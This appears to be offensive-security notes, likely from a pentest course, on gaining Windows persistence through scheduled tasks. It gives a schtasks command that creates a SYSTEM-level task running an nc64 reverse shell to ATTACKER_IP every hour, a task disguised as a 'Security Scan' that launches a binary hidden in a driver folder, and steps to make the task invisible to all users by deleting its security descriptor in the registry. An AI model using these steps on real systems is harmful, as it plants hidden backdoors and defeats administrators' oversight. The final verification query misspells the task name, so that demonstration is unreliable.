# Task Scheduler

### Schtasks Quick Reference

```
#normal task 15 minutes 
SCHTASKS /create /sc minute /mo 15 /tn "Security Scan" /tr "C:\Windows\System32\spool\drivers\color\patch.exe" 
#query all 
SCHTASKS /query
#delete task 
schtasks /delete /tn "\Security Scan" /F
```

* The most common way to schedule tasks is using the built-in Windows task scheduler.
* Let's create a task that runs a reverse shell every single hour.

```
schtasks /create /sc hourly /mo 1 /tn TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "TaskBackdoor" has successfully been created.
```

* To check if our task was successfully created, we can use the following command:

```
schtasks /query /tn TaskBackdoor
Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
TaskBackdoor                         5/25/2022 8:08:00 AM   Ready
```

### Making Our Task Invisible

* Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable.
* To further hide our scheduled task, we can make it invisible to any user in the system by deleting its `Security Descriptor (SD)`. The security descriptor is simply an ACL that states which users have access to the scheduled task.
* If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. -
* Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.
* The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named "`SD`" contains the security descriptor.
* **You can only erase the value if you hold `SYSTEM` privileges.**
* To hide our task, let's delete the `SD` value for the "`TaskBackdoor`" task we created before. To do so, we will use `psexec` to open Regedit with SYSTEM privileges:

```
c:\tools\pstools\PsExec64.exe -s -i regedit
```

* We will then delete the security descriptor for our task:
*

    <figure><img src="https://user-images.githubusercontent.com/75596877/181060133-34619dcd-33be-40f5-aa62-2fead6f2b4de.png" alt=""><figcaption></figcaption></figure>
* If we try to query our service again, the system will tell us there is no such task:

```
schtasks /query /tn TaskBackdoors
ERROR: The system cannot find the file specified.
```
